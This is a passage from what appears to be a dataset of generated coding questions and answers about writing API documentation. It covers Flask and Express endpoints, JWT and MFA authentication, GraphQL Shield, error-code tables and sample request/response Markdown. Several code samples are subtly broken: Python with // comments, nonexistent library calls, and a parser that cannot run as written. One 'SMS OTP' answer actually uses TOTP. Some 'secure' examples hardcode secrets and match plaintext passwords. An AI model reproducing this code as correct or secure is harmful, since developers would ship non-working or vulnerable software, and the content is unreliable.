Flask API sources, and generate a comprehensive Markdown documentation with examples, including support for nested data structures, query parameters, and request bodies.\n\nConcept: \"Programming Language Concepts\" (specifically \"Python\")\n\nSolution:\nYou can create a Python script using the `ast` (Abstract Syntax Trees) module to parse the Flask application, and the `markdown-it-py` library to generate Markdown documentation. This script will traverse the Flask route definitions to extract parameter information and create examples.\n\nExample code:\n```python\nimport ast\nimport inspect\nimport markdown_it\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\ndef extract_params(node):\n    params = []\n    for arg in node.args.args:\n        if isinstance(arg.annotation, ast.List) or isinstance(arg.annotation, ast.Dict):\n            params.append({\n                'name': arg.arg,\n                'type': type(arg.annotation).__name__,\n                'value': ast.literal_eval(arg.annotation)\n            })\n        else:\n            params.append({\n                'name': arg.arg,\n                'type': arg.annotation.id if arg.annotation else 'Any',\n                'value': None\n            })\n    return params\n\ndef generate_docs(app):\n    md = markdown_it.MarkdownIt()\n    lines = []\n    for rule in app.url_map.iter_rules():\n        if rule.endpoint == 'static':\n            continue\n        func = app.view_functions[rule.endpoint]\n        signature = inspect.signature(func)\n        params = extract_params(ast.parse(inspect.getsource(func)).body[0].value)\n        lines.append(f'# {rule.rule}')\n        lines.append('## Parameters')\n        for param in params:\n            lines.append(f'- **{param[\"name\"]}**: {param[\"type\"]}')\n            if param[\"value\"]:\n                lines.append(f'    - Example: {param[\"value\"]}')\n        lines.append('## Request Body')\n        # Extract request body schema if using Flask-RESTPlus or similar\n        # ...\n\n    with open('api_docs.md', 'w') as f:\n        f.write('\\n'.join(lines))\n\n@app.route('/api/data', methods=['POST'])\ndef api_data():\n    request_data = request.get_json()\n    # ...\n    return 'Success'\n\ngenerate_docs(app)\n```\nThis script assumes you have a Flask application with route definitions, and it extracts parameter information from the function signatures. It doesn't cover request bodies, but you can extend it to support frameworks like Flask-RESTPlus that provide structured request body definitions."}, {"L2_TASK": "Create API documentation", "L3_TASK": "Return values", "Complexity_Level": "medium", "Response": "Question 1:\nAs a senior developer, you're asked to create an API endpoint that retrieves user information and returns a JSON object with specific details. However, the API should also handle different response codes and provide meaningful error messages when necessary. Write a medium-complexity problem statement and provide an example implementation in Python using Flask.\n\nProblem Statement:\nDesign a RESTful API endpoint `/api/user/{user_id}` that retrieves a user's information based on their unique `user_id`. The API should return a JSON object containing the user's name, email, and date of registration. If the user is not found, return an HTTP 404 error with a specific error message. If there's an internal server error, return an HTTP 500 error with a generic error message.\n\nExample Solution:\n```python\nfrom flask import Flask, jsonify, abort\nfrom flask_sqlalchemy import SQLAlchemy\n\napp = Flask(__name__)\napp.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'\ndb = SQLAlchemy(app)\n\nclass User(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    name = db.Column(db.String(100), nullable=False)\n    email = db.Column(db.String(120), unique=True, nullable=False)\n    registration_date = db.Column(db.DateTime, nullable=False, default=db.func.current_timestamp())\n\n@app.route('/api/user/<int:user_id>', methods=['GET'])\ndef get_user(user_id):\n    user = User.query.get_or_404(user_id)\n    return jsonify({\n        'name': user.name,\n        'email': user.email,\n        'registration_date': user.registration_date.strftime('%Y-%m-%d %H:%M:%S')\n    })\n\n@app.errorhandler(404)\ndef not_found(error):\n    return jsonify(error={'message': 'User not found'}), 404\n\n@app.errorhandler(500)\ndef internal_server_error(error):\n    return jsonify(error={'message': 'Internal server error'}), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\nConcept: API Design, Error Handling\n\nQuestion 2:\nYou are tasked with creating a Node.js API that retrieves product details from a database and returns the information in a structured JSON format. The API should handle pagination, allowing users to request a specific number of items per page. Also, provide appropriate response codes and messages for successful and failed requests.\n\nProblem Statement:\nDevelop an API endpoint `/api/products` that fetches products from a MongoDB collection. The API should accept two query parameters: `limit` and `skip`, representing the number of items per page and the number of items to skip, respectively. Return a JSON array of products, along with the total number of products. If the database connection fails, return an HTTP 500 error with a specific error message.\n\nExample Solution:\n```javascript\nconst express = require('express');\nconst mongoose = require('mongoose');\nconst app = express();\n\n// Connect to MongoDB\nmongoose.connect('mongodb://localhost/products_db', { useNewUrlParser: true, useUnifiedTopology: true });\nconst db = mongoose.connection;\ndb.on('error', console.error.bind(console, 'connection error:'));\n\n// Product schema\nconst ProductSchema = new mongoose.Schema({\n  name: String,\n  price: Number,\n  description: String\n});\nconst Product = mongoose.model('Product', ProductSchema);\n\napp.use(express.json());\n\napp.get('/api/products', async (req, res) => {\n  try {\n    const limit = parseInt(req.query.limit) || 10;\n    const skip = parseInt(req.query.skip) || 0;\n\n    const products = await Product.find().skip(skip).limit(limit);\n    const totalProducts = await Product.countDocuments();\n\n    res.status(200).json({\n      products,\n      total: totalProducts\n    });\n  } catch (error) {\n    res.status(500).json({ error: 'Failed to fetch products from the database' });\n  }\n});\n\napp.listen(3000, () => {\n  console.log('API server is running on port 3000');\n});\n```\nConcept: API Design, Pagination, Error Handling, MongoDB"}, {"L2_TASK": "Create API documentation", "L3_TASK": "Return values", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nAssume you're developing a complex financial API that provides real-time cryptocurrency exchange rates. The API needs to handle various return types, including nested JSON structures, error messages, and paginated data. Create a comprehensive documentation structure with examples for a method that fetches the historical price data for multiple cryptocurrencies, considering rate limits, pagination, and error scenarios.\n\n**Concept**: API Documentation\n\n**Solution**:\n\n```markdown\n# API Reference: /v1/cryptocurrency/historical-prices\n\n## GET /v1/cryptocurrency/historical-prices\n\nFetches historical price data for multiple cryptocurrencies. Supports pagination and rate limiting.\n\n### Parameters\n\n- `symbols` (required): A comma-separated list of cryptocurrency symbols (e.g., BTC, ETH, LTC)\n- `from_date` (required): The starting date in ISO 8601 format (e.g., 2021-12-01)\n- `to_date` (required): The ending date in ISO 8601 format (e.g., 2021-12-31)\n- `page` (optional): The pagination page number (default: 1)\n- `limit` (optional): The number of records per page (default: 100, max: 500)\n\n### Response\n\n#### Successful (200 OK)\n\n```json\n{\n  \"status\": \"success\",\n  \"data\": {\n    \"symbols\": [\"BTC\", \"ETH\", \"LTC\"],\n    \"from_date\": \"2021-12-01\",\n    \"to_date\": \"2021-12-31\",\n    \"total_records\": 2500,\n    \"page\": 1,\n    \"limit\": 100,\n    \"prices\": [\n      {\n        \"date\": \"2021-12-01\",\n        \"BTC\": {\n          \"open\": 47800.23,\n          \"high\": 52000.12,\n          \"low\": 46500.11,\n          \"close\": 51999.99\n        },\n        \"ETH\": {\n          \"open\": 4000.23,\n          \"high\": 4500.12,\n          \"low\": 3900.11,\n          \"close\": 4499.99\n        },\n        \"LTC\": {\n          \"open\": 195.23,\n          \"high\": 220.12,\n          \"low\": 190.11,\n          \"close\": 219.99\n        }\n      },\n      ...\n    ]\n  }\n}\n```\n\n#### Rate Limit Exceeded (429)\n\n```json\n{\n  \"status\": \"error\",\n  \"code\": 429,\n  \"message\": \"Rate limit exceeded. Maximum of 50 requests per minute allowed.\"\n}\n```\n\n#### Invalid Request (400)\n\n```json\n{\n  \"status\": \"error\",\n  \"code\": 400,\n  \"message\": \"Invalid request parameters. Check 'symbols', 'from_date', and 'to_date'.\"\n}\n```\n\n#### Internal Server Error (500)\n\n```json\n{\n  \"status\": \"error\",\n  \"code\": 500,\n  \"message\": \"An unexpected error occurred. Please try again later.\"\n}\n```\n---\n\nExample Python client code:\n\n```python\nimport requests\nimport json\n\nurl = \"https://api.example.com/v1/cryptocurrency/historical-prices\"\nparams = {\n    \"symbols\": \"BTC,ETH,LTC\",\n    \"from_date\": \"2021-12-01\",\n    \"to_date\": \"2021-12-31\",\n    \"page\": 1,\n    \"limit\": 100\n}\n\nresponse = requests.get(url, params=params)\n\nif response.status_code == 200:\n    data = json.loads(response.content)\n    # Process the data here\nelse:\n    error_data = json.loads(response.content)\n    print(f\"Error: {error_data['message']}\")\n```\n\nQuestion 2:\nDesign a RESTful API for an online bookstore that allows users to search for books by title and author, and also retrieve paginated results with book summaries, ratings, and user reviews. Include examples of response structures for successful search, pagination, and error handling scenarios.\n\n**Concept**: API Documentation\n\n**Solution**:\n\n```markdown\n# API Reference: /v1/bookstore/search\n\n## GET /v1/bookstore/search\n\nSearches for books by title and/or author, returns paginated results with summaries, ratings, and reviews.\n\n### Parameters\n\n- `title` (optional): The book title (partial matches allowed)\n- `author` (optional): The author's name (partial matches allowed)\n- `page` (optional): The pagination page number (default: 1)\n- `limit` (optional): The number of records per page (default: 10, max: 50)\n\n### Response\n\n#### Successful (200 OK)\n\n```json\n{\n  \"status\": \"success\",\n  \"data\": {\n    \"total_results\": 25,\n    \"page\": 1,\n    \"limit\": 10,\n    \"books\": [\n      {\n        \"id\": 1,\n        \"title\": \"The Great Gatsby\",\n        \"author\": \"F. Scott Fitzgerald\",\n        \"summary\": \"A story of the wealthy Jay Gatsby and his pursuit of the unattainable Daisy Buchanan.\",\n        \"rating\": 4.3,\n        \"reviews\": [\n          {\n            \"user_id\": 123,\n            \"user_name\": \"JaneDoe\",\n            \"review\": \"A timeless classic!\",\n            \"date\": \"2023-02-15\"\n          },\n          ...\n        ]\n      },\n      ...\n    ]\n  }\n}\n```\n\n#### Pagination (200 OK, with truncated data)\n\n```json\n{\n  \"status\": \"success\",\n  \"data\": {\n    \"total_results\": 25,\n    \"page\": 2,\n    \"limit\": 10,\n    \"books\": [\n      {\n        \"id\": 11,\n        \"title\": \"Pride and Prejudice\",\n        \"author\": \"Jane Austen\",\n        ...\n      },\n      ...\n    ]\n  }\n}\n```\n\n#### No Results (200 OK)\n\n```json\n{\n  \"status\": \"success\",\n  \"data\": {\n    \"total_results\": 0,\n    \"page\": 1,\n    \"limit\": 10,\n    \"books\": []\n  }\n}\n```\n\n#### Invalid Request (400 Bad Request)\n\n```json\n{\n  \"status\": \"error\",\n  \"code\": 400,\n  \"message\": \"Both title and author cannot be empty.\"\n}\n```\n\n#### Server Error (500 Internal Server Error)\n\n```json\n{\n  \"status\": \"error\",\n  \"code\": 500,\n  \"message\": \"An unexpected error occurred while processing the request.\"\n}\n```\n\n---\n\nExample Python client code:\n\n```python\nimport requests\nimport json\n\nbase_url = \"https://api.example.com/v1/bookstore\"\nsearch_url = f\"{base_url}/search\"\nparams = {\n    \"title\": \"The Great\",\n    \"author\": \"Fitzgerald\",\n    \"page\": 1,\n    \"limit\": 10\n}\n\nresponse = requests.get(search_url, params=params)\n\nif response.status_code == 200:\n    data = json.loads(response.content)\n    # Process the search results here\nelse:\n    error_data = json.loads(response.content)\n    print(f\"Error: {error_data['message']}\")\n```"}, {"L2_TASK": "Create API documentation", "L3_TASK": "Authentication requirements", "Complexity_Level": "medium", "Response": "Question 1: How can you design a REST API with authentication requirements, ensuring that only authorized users can access protected resources using JSON Web Tokens (JWT)? Provide an example of creating an authentication endpoint and validating the token in a protected route.\n\nConcept: API Design, Authentication, JSON Web Tokens\n\nSolution:\nTo design a REST API with JWT authentication, you'll first need to create an endpoint for user login that generates a JWT upon successful authentication. Then, you'll need to implement middleware to validate the token in protected routes. Here's an example using Node.js and Express:\n\n1. Install required packages:\n```bash\nnpm install express jsonwebtoken bcryptjs\n```\n1. Import the packages and set secret key:\n```javascript\nconst express = require('express');\nconst jwt = require('jsonwebtoken');\nconst bcrypt = require('bcryptjs');\nconst app = express();\nconst secretKey = 'your_secret_key'; // Replace with a secure secret\n```\n1. Create a `login` route to generate JWT:\n```javascript\napp.post('/login', async (req, res) => {\n  const { username, password } = req.body;\n\n  // Assume you have a user database\n  const user = await getUser(username);\n\n  if (!user || !(await bcrypt.compare(password, user.password))) {\n    return res.status(401).json({ message: 'Invalid credentials' });\n  }\n\n  const token = jwt.sign({ userId: user.id, username }, secretKey, { expiresIn: '1h' });\n  res.json({ token, userId: user.id });\n});\n```\n1. Create a middleware function to validate the token:\n```javascript\nconst authenticateToken = (req, res, next) => {\n  const authHeader = req.headers['authorization'];\n  const token = authHeader && authHeader.split(' ')[1];\n\n  if (token == null) return res.sendStatus(401);\n\n  jwt.verify(token, secretKey, (err, user) => {\n    if (err) return res.sendStatus(403);\n\n    req.user = user;\n    next();\n  });\n};\n```\n1. Create a protected route using the middleware:\n```javascript\napp.get('/protected', authenticateToken, (req, res) => {\n  res.json({ message: 'You accessed a protected route', userId: req.user.userId });\n});\n```\n1. Start the server:\n```javascript\nconst port = process.env.PORT || 3000;\napp.listen(port, () => console.log(`Server is running on port ${port}`));\n```\nIn this example, users can log in with their credentials, and if successful, they receive a JWT token. The `authenticateToken` middleware checks the token for validity before allowing access to the protected route `/protected`.\n\nQuestion 2: How can you design a GraphQL API with authentication requirements using GraphQL Shield and GraphQL Nexus? Explain by creating a policy to restrict access to a specific mutation based on user roles.\n\nConcept: GraphQL, Authentication, GraphQL Shield, GraphQL Nexus\n\nSolution:\nIn this example, we'll create a GraphQL API using GraphQL Nexus and implement authentication using GraphQL Shield. The policy will restrict access to a specific mutation based on user roles.\n\n1. Install required packages:\n```bash\nnpm install graphql nexus nexus-plugin-prisma graphql-shield\n```\n1. Import the packages:\n```javascript\nconst { makeSchema } = require('@nexus/schema');\nconst { Shield } = require('graphql-shield');\nconst prisma = require('./prismaClient'); // Assuming you have a Prisma client\n```\n1. Create a role-based policy:\n```javascript\nconst isUserAdmin = rule({ cache: 'strong' })(async (parent, args, ctx, info) => {\n  const user = ctx.user;\n  if (!user) return false;\n\n  return user.role === 'admin';\n});\n```\n1. Define the GraphQL schema using Nexus:\n```javascript\nconst typeDefs = `\n  type User {\n    id: ID!\n    username: String!\n    role: String!\n  }\n\n  type Query {\n    me: User\n  }\n\n  type Mutation {\n    deletePost(id: ID!): Boolean\n  }\n`;\n\nconst mutations = {\n  deletePost: isUserAdmin(async (parent, { id }, ctx) => {\n    const post = await prisma.post.delete({ where: { id } });\n    return !!post;\n  }),\n};\n\nconst queries = {\n  me: (parent, args, ctx) => ctx.user,\n};\n\nconst schema = makeSchema({\n  types: [mutations, queries],\n});\n```\n1. Create a GraphQL Shield instance and apply the policy to the schema:\n```javascript\nconst rules = {\n  Query: {\n    me: isUserAdmin,\n  },\n  Mutation: {\n    deletePost: isUserAdmin,\n  },\n};\n\nconst shield = new Shield(rules, { debug: true });\n\nconst schemaWithAuthorization = shield.extendSchema(schema);\n```\n1. Create an Express server to run the GraphQL API:\n```javascript\nconst express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\n\nconst app = express();\n\napp.use(\n  '/graphql',\n  graphqlHTTP((req) => ({\n    schema: schemaWithAuthorization,\n    context: {\n      user: req.user, // Assuming you have a middleware to extract user from the request\n    },\n    graphiql: true, // Enable GraphQL Playground for testing\n  })),\n);\n\nconst port = process.env.PORT || 3000;\napp.listen(port, () => console.log(`Server is running on port ${port}`));\n```\nIn this example, the `isUserAdmin` policy checks if the user has an 'admin' role. The policy is applied to the `deletePost` mutation, ensuring that only users with the 'admin' role can delete posts. The `context` in the GraphQL HTTP middleware is used to pass the user information to the Shield rules."}, {"L2_TASK": "Create API documentation", "L3_TASK": "Authentication requirements", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a secure API documentation system that incorporates multi-factor authentication (MFA) using JSON Web Tokens (JWT) and one-time passcodes (OTP) delivered through SMS. The system should be resistant to common security vulnerabilities, such as replay attacks, and should enforce strict access control based on user roles.\n\n**Concept**: API Documentation, Authentication, JWT, Multi-Factor Authentication\n\n**Solution**:\n```python\nfrom flask import Flask, request, jsonify, make_response\nfrom flask_jwt_extended import JWTManager, jwt_required, create_access_token, get_jwt_identity\nfrom flask_limiter import Limiter\nimport secrets\nimport pyotp\nimport requests\nfrom sqlalchemy import create_engine, Column, Integer, String, ForeignKey\nfrom sqlalchemy.orm import sessionmaker, relationship\nfrom sqlalchemy.ext.declarative import declarative_base\n\napp = Flask(__name__)\napp.config['JWT_SECRET_KEY'] = 'super-secret-key'\njwt = JWTManager(app)\nlimiter = Limiter(app, key_func=get_remote_address)\n\nBase = declarative_base()\nengine = create_engine('sqlite:///user_db.db')\nDBSession = sessionmaker(bind=engine)\nBase.metadata.bind = engine\n\nclass User(Base):\n    __tablename__ = 'users'\n    id = Column(Integer, primary_key=True)\n    username = Column(String(80), unique=True, nullable=False)\n    password = Column(String(120), nullable=False)\n    otp_secret = Column(String(16), nullable=False)\n    role = Column(String(20), nullable=False)\n\nBase.create_all()\n\ndef create_user(username, password, otp_secret, role):\n    user = User(username=username, password=password, otp_secret=otp_secret, role=role)\n    session = DBSession()\n    session.add(user)\n    session.commit()\n\n@app.route('/login', methods=['POST'])\n@limiter.limit('5/minute')  # Limit login attempts\ndef login():\n    data = request.get_json()\n    user = DBSession().query(User).filter_by(username=data['username'], password=data['password']).first()\n    if user:\n        totp = pyotp.TOTP(user.otp_secret)\n        if totp.verify(data['otp']):\n            access_token = create_access_token(identity=user.id, expires_delta=False, user_claims={'role': user.role})\n            return jsonify({'access_token': access_token}), 200\n    return jsonify({'message': 'Authentication failed'}), 401\n\n@app.route('/protected', methods=['GET'])\n@jwt_required\ndef protected():\n    user_id = get_jwt_identity()\n    user = DBSession().query(User).get(user_id)\n    if user.role != 'admin':\n        return jsonify({'message': 'Unauthorized access'}), 403\n    return jsonify({'message': 'Welcome, Admin!'})\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\nThe code above demonstrates a simple Flask application with MFA using JWT and OTP via SMS. It uses SQLAlchemy for database management and the Flask-JWT-Extended library for handling JWTs. The system is designed to protect against replay attacks by incorporating a one-time passcode that expires quickly. Access control is enforced based on the user's role.\n\nQuestion 2: Design a comprehensive API documentation tool that dynamically generates documentation from OpenAPI v3 specifications, supports API key authentication, and integrates with a rate-limiting mechanism to prevent abuse. The tool should also include advanced features like real-time testing, code snippet generation for popular programming languages, and interactive examples.\n\n**Concept**: API Documentation, Authentication, OpenAPI, Rate Limiting\n\n**Solution**:\n```python\nfrom flask import Flask, request, jsonify\nfrom flask_openapi3 import OpenAPI, APIKey\nfrom flas"}, {"L2_TASK": "Create API documentation", "L3_TASK": "Error codes explanation", "Complexity_Level": "medium", "Response": "Question 1:\n\n```\nProblem: You are developing a REST API for a book library application and need to document a set of common error codes with explanations. Create a JSON structure to represent these error codes and provide an example of how to handle a \"BookNotAvailable\" error in Python.\n\nConcept: API Documentation, Error Codes\n\nSolution:\n```\n```json\n{\n  \"error_codes\": {\n    \"100\": {\n      \"code\": 100,\n      \"description\": \"BookNotAvailable\",\n      \"message\": \"The requested book is currently not available in the library.\"\n    },\n    \"101\": {\n      \"code\": 101,\n      \"description\": \"InvalidISBN\",\n      \"message\": \"The provided ISBN is invalid or does not match any book in the library.\"\n    },\n    // Other error codes...\n  }\n}\n```\n\n```python\nimport json\n\ndef handle_error(error_code, error_data):\n    error_codes = {\n        \"100\": \"BookNotAvailable\",\n        \"101\": \"InvalidISBN\",\n        // Other error codes...\n    }\n\n    if error_code in error_codes:\n        error_name = error_codes[error_code]\n        error_message = error_data[\"message\"]\n        print(f\"Error: {error_name} - {error_message}\")\n    else:\n        print(\"Unknown error code\")\n\n# Example response from API\napi_response = {\n    \"error\": {\n        \"code\": 100,\n        \"description\": \"BookNotAvailable\",\n        \"message\": \"The requested book is currently not available in the library.\"\n    }\n}\n\nerror_code = api_response[\"error\"][\"code\"]\nerror_data = api_response[\"error\"]\nhandle_error(error_code, error_data)\n```\nQuestion 2:\n\n```\nProblem: Design a function in JavaScript that reads a JSON file containing error codes and explanations, and generates markdown-formatted documentation for these errors. The function should output a markdown table with columns for error code, description, and message.\n\nConcept: API Documentation, Error Codes, JavaScript, File I/O\n\nSolution:\n```javascript\nconst fs = require('fs').promises;\n\nasync function generateErrorDocs(errorFilePath) {\n  try {\n    const errorData = await fs.readFile(errorFilePath, 'utf-8');\n    const errorCodes = JSON.parse(errorData).error_codes;\n\n    console.log('| Error Code | Description | Message |\\n| --- | --- | --- |');\n\n    for (const errorCode in errorCodes) {\n      const error = errorCodes[errorCode];\n      console.log(`| ${errorCode} | ${error.description} | ${error.message} |`);\n    }\n  } catch (err) {\n    console.error('Error reading error codes:', err);\n  }\n}\n\n// Assuming the JSON file is named \"error_codes.json\" in the same directory\ngenerateErrorDocs('./error_codes.json');\n```\nThis JavaScript function reads a JSON file containing error codes and descriptions, and outputs the information in a markdown table format for easy documentation. The user needs to provide the path to the JSON file."}, {"L2_TASK": "Create API documentation", "L3_TASK": "Error codes explanation", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nIn a complex API system with multiple microservices, design a standardized error code explanation structure that can be easily integrated into the API documentation, while also handling asynchronous errors and ensuring consistency across services. The solution should enable automatic generation of documentation, support for multiple error formats (JSON, XML), and maintain the ability to link to additional resources.\n\nSolution:\nConcept: API Documentation, Error Handling, Microservices\n\n```python\n# Define a base error class\nclass APIError(Exception):\n    status_code: int\n    error_code: int\n    message: str\n    additional_resources: dict\n\n    def __init__(self, status_code, error_code, message, additional_resources=None):\n        self.status_code = status_code\n        self.error_code = error_code\n        self.message = message\n        self.additional_resources = additional_resources or {}\n\n# Create service-specific error classes\nclass UserServiceError(APIError):\n    pass\n\nclass ProductServiceError(APIError):\n    pass\n\n# Example error instances\nuser_not_found_error = UserServiceError(\n    404, 1001, \"User not found\",\n    additional_resources={\n        \"guide\": \"https://docs.user-service.com/errors#1001\",\n        \"example\": \"https://api.user-service.com/users/99999\"\n    }\n)\n\nproduct_out_of_stock = ProductServiceError(\n    400, 2001, \"Product is out of stock\",\n    additional_resources={\n        \"guide\": \"https://docs.product-service.com/errors#2001\",\n        \"replenishment\": \"https://api.product-service.com/products/12345/replenish\"\n    }\n)\n\n# Function to convert errors to JSON\ndef error_to_json(error):\n    if isinstance(error, APIError):\n        return {\n            \"error_code\": error.error_code,\n            \"message\": error.message,\n            \"status_code\": error.status_code,\n            \"additional_resources\": error.additional_resources\n        }\n    return {\"error\": \"Internal server error\"}\n\n# Generate documentation automatically\ndef generate_doc():\n    errors_doc = {}\n    for error_class in [UserServiceError, ProductServiceError]:\n        for error_code, error in error_class.__dict__.items():\n            if isinstance(error, type) and issubclass(error, error_class) and error is not error_class:\n                errors_doc[f\"{error_class.__name__}.{error_code}\"] = {\n                    \"message\": error.message,\n                    \"status_code\": error.status_code,\n                    \"link\": f\"https://docs.api.com/{error_class.__name__.lower()}/{error_code}\"\n                }\n    return errors_doc\n\n# Save the generated documentation to a JSON file\nwith open('api_errors.json', 'w') as f:\n    json.dump(generate_doc(), f, indent=4)\n\n# Example usage\ntry:\n    raise user_not_found_error\nexcept APIError as e:\n    response_data = error_to_json(e)\n    # Send response_data as the error response in JSON or XML format\n```\n\nQuestion 2:\nDevelop a sophisticated middleware for a Node.js Express API that intercepts, records, and responds to errors with a standardized error code structure. The middleware should handle nested errors, support asynchronous errors, log errors with severity levels, and send alerts to a monitoring service.\n\nSolution:\nConcept: API Error Handling, Middleware, Node.js\n\n```javascript\nconst { createLogger, format, transports } = require('winston');\nconst express = require('express');\nconst { ErrorMiddleware } = require('express-error-handler');\n\n// Configure Winston logger\nconst logger = createLogger({\n  level: 'info',\n  format: format.combine(format.json(), format.timestamp()),\n  transports: [\n    new transports.File({ filename: 'api.log', level: 'error' }),\n    new transports.File({ filename: 'combined.log' }),\n    new transports.Console({ level: 'debug' })\n  ]\n});\n\n// Custom error class\nclass APIError extends Error {\n  constructor(status, code, message, details) {\n    super(message);\n    this.status = status;\n    this.code = code;\n    this.details = details;\n  }\n}\n\n// Middleware function\nconst logAndAlertErrors = ErrorMiddleware({\n  async handle(error, req, res, next) {\n    const { status = 500, code, message, details } = error instanceof APIError ? error : { message: error.message, status: 500 };\n\n    // Log error with severity level\n    logger.error({\n      error: {\n        status,\n        code,\n        message,\n        details\n      },\n      meta: { req, timestamp: new Date().toISOString() }\n    });\n\n    // Send alert to monitoring service (e.g. Sentry, Datadog)\n    sendAlertToMonitoringService({ status, code, message, details });\n\n    // Send standardized error response\n    res.status(status).json({ code, message, details });\n  }\n});\n\n// Create express app\nconst app = express();\n\n// Apply error handling middleware\napp.use(logAndAlertErrors);\n\n// Example route\napp.get('/users/:id', async (req, res, next) => {\n  try {\n    const userId = req.params.id;\n    const user = await getUser(userId); // Assume this function can throw errors\n    res.json(user);\n  } catch (error) {\n    next(error);\n  }\n});\n\n// Start server\napp.listen(3000, () => {\n  console.log('API server is running on port 3000');\n});\n\n// Function to send alerts to monitoring service\nfunction sendAlertToMonitoringService(error) {\n  // Implement your monitoring service integration here\n  console.log('Sending error alert to monitoring service:', error);\n}\n```\n\nNote: The `express-error-handler` library is a hypothetical library used for the middleware and is not an actual library. You would need to replace it with a suitable error handling middleware for Express."}, {"L2_TASK": "Create API documentation", "L3_TASK": "Sample request/response", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: API Documentation, Sample Request/Response\n\nProblem: Create an example of a REST API documentation for a \"Get User Profile\" endpoint that demonstrates a medium complexity request and response structure. The API should accept a user ID and return user details including basic information, recent activities, and a list of friends.\n\nSolution:\n\n```markdown\n# API Documentation: Get User Profile\n## Endpoint: GET /api/v1/users/{userId}\nThis API endpoint retrieves a user's profile based on the provided user ID.\n\n### Request URL\n```\nGET https://api.example.com/api/v1/users/1234\n```\n### Request Headers\n| Key        | Value             | Description                               |\n|------------|-------------------|-------------------------------------------|\n| Authorization | Bearer ABCDEFGH123 | Provide valid JSON Web Token for auth |\n\n### Request Parameters\nNone\n\n### Response Structure (HTTP Status: 200 - OK)\n```json\n{\n  \"user\": {\n    \"id\": \"1234\",\n    \"name\": \"John Doe\",\n    \"email\": \"john.doe@example.com\",\n    \"dob\": \"1990-01-01T00:00:00Z\"\n  },\n  \"recentActivities\": [\n    {\n      \"id\": \"activity1\",\n      \"type\": \"Post\",\n      \"title\": \"My Recent Blog Post\",\n      \"timestamp\": \"2022-10-01T13:45:00Z\"\n    },\n    {\n      \"id\": \"activity2\",\n      \"type\": \"Comment\",\n      \"content\": \"Great job!\",\n      \"timestamp\": \"2022-09-25T10:15:00Z\"\n    }\n  ],\n  \"friends\": [\n    {\n      \"id\": \"friend1\",\n      \"name\": \"Jane Smith\",\n      \"email\": \"jane.smith@example.com\"\n    },\n    {\n      \"id\": \"friend2\",\n      \"name\": \"Mike Johnson\",\n      \"email\": \"mike.johnson@example.com\"\n    }\n  ]\n}\n```\n### Error Responses\n- **401 Unauthorized**: Invalid or missing authentication token.\n- **404 Not Found**: User with the specified ID does not exist.\n\n---\n\nQuestion 2:\nConcept: API Documentation, Sample Request/Response\n\nProblem: Design a sample request and response for a GraphQL API that fetches a product by its ID, including its category, reviews, and related products.\n\nSolution:\n\n```markdown\n# API Documentation: GraphQL Query for Product Details\n## Query\n```graphql\nquery GetProduct($productId: ID!) {\n  getProduct(productId: $productId) {\n    id\n    name\n    description\n    category {\n      id\n      name\n    }\n    reviews {\n      id\n      rating\n      comment\n      author {\n        id\n        name\n      }\n    }\n    relatedProducts {\n      id\n      name\n      price\n    }\n  }\n}\n```\n### Variables\n```json\n{\n  \"productId\": \"1234\"\n}\n```\n### Response Structure\n```json\n{\n  \"data\": {\n    \"getProduct\": {\n      \"id\": \"1234\",\n      \"name\": \"Smartphone X\",\n      \"description\": \"The latest flagship device with top-notch features.\",\n      \"category\": {\n        \"id\": \"electronics\",\n        \"name\": \"Electronics\"\n      },\n      \"reviews\": [\n        {\n          \"id\": \"review1\",\n          \"rating\": 5,\n          \"comment\": \"Best phone I've ever owned!\",\n          \"author\": {\n            \"id\": \"user1\",\n            \"name\": \"Happy Customer\"\n          }\n        },\n        {\n          \"id\": \"review2\",\n          \"rating\": 4,\n          \"comment\": \"Great device, but battery life could be better.\",\n          \"author\": {\n            \"id\": \"user2\",\n            \"name\": \"Tech Enthusiast\"\n          }\n        }\n      ],\n      \"relatedProducts\": [\n        {\n          \"id\": \"productY\",\n          \"name\": \"Smartphone Y\",\n          \"price\": 699.99\n        },\n        {\n          \"id\": \"productZ\",\n          \"name\": \"Smartwatch Z\",\n          \"price\": 299.99\n        }\n      ]\n    }\n  }\n}\n```\n### Error Handling\n- **Field Error**: If a problem occurs fetching specific fields, GraphQL will return an error object detailing the issue.\n- **Authentication Error**: If the request requires authentication and the token is missing or invalid, a custom error will be returned."}, {"L2_TASK": "Create API documentation", "L3_TASK": "Sample request/response", "Complexity_Level": "extremely difficult", "Response": "Question 1: Create a comprehensive API documentation generator that not only includes sample requests and responses but also dynamically generates security schemas, error handling guidelines, and performance metrics for a complex RESTful API with multiple endpoints, data models, and authentication methods. Additionally, the documentation should be automatically updated whenever the API code changes.\n\n**Concept**: API Documentation, RESTful API, Security Schemas, Error Handling, Performance Metrics\n\n**Solution**: To solve this problem, we can use a combination of tools, such as OpenAPI (formerly known as Swagger), Python, and a code analysis library like Pydantic for Python-based APIs.\n\nFirst, define the OpenAPI specification for the API, including endpoints, schemas, security definitions, and error handling. Here's a simplified example in YAML:\n\n```yaml\nopenapi: 3.0.2\ninfo:\n  title: Complex RESTful API\n  version: 1.0.0\nservers:\n  - url: https://api.example.com\npaths:\n  /users:\n    post:\n      summary: Create a new user\n      operationId: createUser\n      requestBody:\n        required: true\n        content:\n          application/json:\n            schema:\n              $ref: '#/components/schemas/User'\n      responses:\n        '201':\n          description: User created\n          content:\n            application/json:\n              schema:\n                $ref: '#/components/schemas/User'\n        '400':\n          description: Bad Request\n          content:\n            application/json:\n              schema:\n                $ref: '#/components/schemas/Error'\n      security:\n        - apiKey: []\ncomponents:\n  schemas:\n    User:\n      type: object\n      properties:\n        name:\n          type: string\n    Error:\n      type: object\n      properties:\n        message:\n          type: string\n  securitySchemes:\n    apiKey:\n      type: apiKey\n      in: header\n      name: X-API-Key\n```\n\nNext, use a Python-based tool like `FastAPI` to create the API, which will automatically generate OpenAPI spec based on the code:\n\n```python\nfrom fastapi import FastAPI, HTTPException\nfrom pydantic import BaseModel\n\napp = FastAPI()\n\nclass User(BaseModel):\n    name: 